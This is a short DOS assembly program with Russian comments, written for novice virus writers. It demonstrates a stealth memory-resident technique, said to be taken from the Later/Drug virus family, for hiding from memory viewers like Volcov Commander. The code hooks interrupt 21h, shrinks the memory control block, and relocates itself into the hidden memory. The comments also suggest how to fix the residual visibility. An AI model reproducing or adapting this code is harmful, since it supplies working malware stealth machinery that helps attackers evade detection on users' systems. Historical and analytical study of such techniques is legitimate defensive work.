;Невидимые резидентки - основная трудность для начинающих вирмакеров
;Эта  программа демонстрирует, как можно обмануть Volcov Commander и
;другие вьюверы памяти

;Невидимый  резидент  был  выдран из семейства Later/Drug, но у него
;есть пара недостатков:
;а) вирус виден Volcov Commander как отдельный блок памяти помеченный
;   system. (можно избежать маркировкой не 8 а 70h), но
;б) в  некоторых  случаях  (запуск  под Windows 95 во время загрузки)
;   выдаются сообщения типа: "Не хватает памяти", "Не могу  загрузить
;   COMMAND.COM", - короче система виснет.

.model tiny
.code
const1  equ offset end_v-offset start
const2  equ (offset end_v-offset start)/16+1

	org 100h
start:
	mov ax,3521h
	int 21h
	mov cs:[old_i],bx
	mov cs:[old_i+2],es

	mov si,2
	mov ax,ds
	dec ax
	mov ds,ax
	sub word ptr ds:[si+1],const2
	push cs
	pop ds
	sub word ptr ds:[si],const2
	mov ax,ds:[si]
	sub ax,16
	mov ds,ax
	mov ax,2521h
	mov dx,offset new_21
	int 21h
	push ds
	push cs
	pop ds
	pop es
	mov si,100h
	mov di,si
	mov cx,const1
	cld
	rep movsb
	mov ax,4c00h
	int 21h
new_21:
	push es ax
	mov ax,0b800h
	mov es,ax
	mov word ptr es:[0],'SC'
	pop ax es
	db 0eah
old_i	dw 0,0
end_v:
end start
